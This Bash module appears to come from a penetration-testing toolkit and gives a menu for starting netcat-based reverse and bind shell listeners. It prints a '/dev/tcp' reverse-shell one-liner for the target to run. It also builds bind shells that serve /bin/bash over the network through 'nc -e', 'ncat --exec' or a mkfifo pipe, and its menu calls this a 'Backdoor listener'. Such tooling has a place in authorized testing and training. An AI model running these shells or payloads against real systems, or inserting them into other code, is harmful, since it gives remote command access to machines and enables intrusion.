#!/bin/bash
################################################################################
# Listeners Module - Bind & Reverse shell listeners
################################################################################

# Detect the best available netcat variant and return "cmd|listen_flags|exec_supported"
# listen_flags: flags used to open a listening port (without the port number)
# exec_supported: "yes" if -e /bin/bash works, "no" otherwise
detect_nc() {
    if command -v ncat &>/dev/null; then
        # ncat (nmap): port positional, no -p needed; -e supported via --exec
        echo "ncat|-l -n -v|yes"
    elif command -v nc &>/dev/null; then
        local nc_help
        nc_help=$(nc -h 2>&1)
        if echo "$nc_help" | grep -q '\-e'; then
            # Traditional netcat with -e support
            echo "nc|-l -n -v -p|yes"
        else
            # OpenBSD netcat: -l takes port directly, no -e
            echo "nc|-l -n -v|no"
        fi
    elif command -v netcat &>/dev/null; then
        echo "netcat|-l -n -v -p|yes"
    else
        echo "||no"
    fi
}

listeners_menu() {
    while true; do
        clear
        echo ""
        echo "$(color_cyan '╔══════════════════════════════════════════╗')"
        echo "$(color_cyan '║')     LISTENERS MENU                      $(color_cyan '║')"
        echo "$(color_cyan '╚══════════════════════════════════════════╝')"
        echo ""
        echo "  $(color_yellow '1.')  Start Reverse Listener  (Catch incoming shells)"
        echo "  $(color_yellow '2.')  Start Bind Listener     (Backdoor listener)"
        echo "  $(color_yellow '3.')  List Active Listeners"
        echo "  $(color_yellow '4.')  Stop Listener"
        echo "  $(color_yellow '5.')  Session Notes"
        echo "  $(color_yellow '6.')  Back to Main Menu"
        echo ""
        echo -n "Select option: "
        read -r choice

        case "$choice" in
            1) setup_reverse_listener ;;
            2) setup_bind_listener ;;
            3) list_listeners ;;
            4) stop_listener ;;
            5) session_notes_menu ;;
            6) break ;;
            *) error_msg "Invalid option"; sleep 2 ;;
        esac
    done
}

# Setup reverse listener
setup_reverse_listener() {
    echo ""
    echo "$(color_cyan '═══ REVERSE LISTENER ═══')"
    echo ""

    echo -n "Listen on IP [0.0.0.0]: "
    local listen_ip
    read -r listen_ip
    listen_ip="${listen_ip:-0.0.0.0}"

    echo -n "Listen on PORT [4444]: "
    local listen_port
    read -r listen_port
    listen_port="${listen_port:-4444}"

    if ! validate_port "$listen_port"; then
        error_msg "Invalid port number"
        sleep 2
        return 1
    fi

    echo -n "Use rlwrap for history? [y/n]: "
    local use_rlwrap
    read -r use_rlwrap

    # Detect nc variant
    local nc_info
    nc_info=$(detect_nc)
    local nc_cmd="${nc_info%%|*}"
    local nc_flags="${nc_info#*|}"
    nc_flags="${nc_flags%|*}"

    if [[ -z "$nc_cmd" ]]; then
        error_msg "No netcat variant found. Install nc, ncat, or netcat."
        sleep 3
        return 1
    fi

    # Generate session ID
    local session_id
    session_id=$(generate_session_id)
    create_session "$session_id" "$listen_ip" "$listen_port" "0.0.0.0" "0"

    log_info "Starting reverse listener on ${listen_ip}:${listen_port} using ${nc_cmd}"
    success_msg "Listener starting... (using $nc_cmd)"

    # Build command — ncat takes port positionally, others need -p
    local cmd
    if [[ "$nc_cmd" == "ncat" ]]; then
        cmd="ncat $nc_flags ${listen_port}"
    elif echo "$nc_info" | grep -q '|-l -n -v -p|'; then
        cmd="$nc_cmd $nc_flags ${listen_port}"
    else
        # OpenBSD nc: port is positional after -l
        cmd="$nc_cmd -l -n -v ${listen_port}"
    fi

    # Add rlwrap if available and requested
    if [[ "$use_rlwrap" == "y" ]] && command -v rlwrap &>/dev/null; then
        cmd="rlwrap -H ~/.shell_history -r $cmd"
        log_info "rlwrap enabled for session $session_id"
    fi

    local detected_ip
    detected_ip=$(get_local_ip)
    echo ""
    echo "$(color_green '✓') Listening on 0.0.0.0:${listen_port}  [${nc_cmd}]"
    echo "$(color_yellow 'Session ID:') $session_id"
    echo ""
    echo "$(color_cyan 'Connect from target with:')"
    echo "  bash -i >& /dev/tcp/${detected_ip}/${listen_port} 0>&1"
    echo ""
    echo "$(color_cyan 'Session log:') ${SESSION_DIR}/${session_id}.json"
    echo ""

    log_session "$session_id" "listener_started" "Reverse listener on port ${listen_port}"

    eval "$cmd"

    log_session "$session_id" "listener_ended" "Connection closed"
    log_info "Reverse listener ended for session $session_id"

    echo ""
    echo -n "Add a note to this session? [y/n]: "
    local add_note
    read -r add_note
    if [[ "$add_note" == "y" ]]; then
        add_session_note "$session_id"
    fi

    sleep 2
}

# Setup bind listener
setup_bind_listener() {
    echo ""
    echo "$(color_cyan '═══ BIND LISTENER ═══')"
    echo ""

    echo -n "Listen on PORT [4444]: "
    local listen_port
    read -r listen_port
    listen_port="${listen_port:-4444}"

    if ! validate_port "$listen_port"; then
        error_msg "Invalid port number"
        sleep 2
        return 1
    fi

    echo -n "Enable rlwrap? [y/n]: "
    local use_rlwrap
    read -r use_rlwrap

    # Detect nc variant
    local nc_info
    nc_info=$(detect_nc)
    local nc_cmd="${nc_info%%|*}"
    local nc_flags="${nc_info#*|}"
    nc_flags="${nc_flags%|*}"
    local exec_supported="${nc_info##*|}"

    if [[ -z "$nc_cmd" ]]; then
        error_msg "No netcat variant found. Install nc, ncat, or netcat."
        sleep 3
        return 1
    fi

    # Generate session ID
    local session_id
    session_id=$(generate_session_id)
    create_session "$session_id" "127.0.0.1" "$listen_port" "0.0.0.0" "0"

    log_info "Starting bind listener on port ${listen_port} using ${nc_cmd}"
    success_msg "Bind listener starting... (using $nc_cmd)"

    local cmd
    if [[ "$exec_supported" == "yes" ]]; then
        if [[ "$nc_cmd" == "ncat" ]]; then
            cmd="ncat $nc_flags ${listen_port} --exec /bin/bash"
        else
            cmd="$nc_cmd $nc_flags ${listen_port} -e /bin/bash"
        fi
    else
        # OpenBSD nc — no -e flag; use mkfifo workaround
        warn_msg "$nc_cmd does not support -e; using mkfifo workaround"
        local fifo="/tmp/.nc_fifo_${listen_port}"
        cmd="rm -f $fifo; mkfifo $fifo; /bin/bash -i < $fifo | $nc_cmd -l -n -v ${listen_port} > $fifo"
    fi

    # Add rlwrap if requested (only makes sense for simple nc; skip for exec mode)
    if [[ "$use_rlwrap" == "y" ]] && command -v rlwrap &>/dev/null && [[ "$exec_supported" == "yes" ]]; then
        cmd="rlwrap -H ~/.shell_history -r $cmd"
    fi

    echo ""
    echo "$(color_green '✓') Bind listener started on port ${listen_port}  [${nc_cmd}]"
    echo "$(color_yellow 'Session ID:') $session_id"
    echo ""
    echo "$(color_cyan 'To connect:') nc -v 127.0.0.1 ${listen_port}"
    echo ""

    # Start in background
    eval "$cmd" &
    local pid=$!
    echo "$(color_yellow 'Listener PID:') $pid"
    echo ""

    log_info "Bind listener started with PID $pid on port ${listen_port}"
    log_session "$session_id" "bind_listener_started" "PID=$pid, Port=${listen_port}"
    sleep 3
}

# List active listeners
list_listeners() {
    echo ""
    echo "$(color_cyan '═══ ACTIVE LISTENERS ═══')"
    echo ""

    local listeners
    listeners=$(ps aux | grep -E '[n]c.*-l|[n]cat.*-l|netcat.*-l' | grep -v grep)

    if [[ -z "$listeners" ]]; then
        info_msg "No active listeners"
        echo ""
        sleep 2
        return
    fi

    echo "$listeners"
    echo ""
    sleep 3
}

# Stop listener by PID
stop_listener() {
    echo ""
    echo "$(color_cyan '═══ STOP LISTENER ═══')"
    echo ""

    echo -n "Enter PID to stop: "
    local pid
    read -r pid

    if ! [[ "$pid" =~ ^[0-9]+$ ]]; then
        error_msg "Invalid PID"
        sleep 2
        return 1
    fi

    if kill -9 "$pid" 2>/dev/null; then
        success_msg "Listener stopped (PID: $pid)"
        log_info "Stopped listener with PID $pid"
    else
        error_msg "Failed to stop listener or PID not found"
    fi
    sleep 2
}
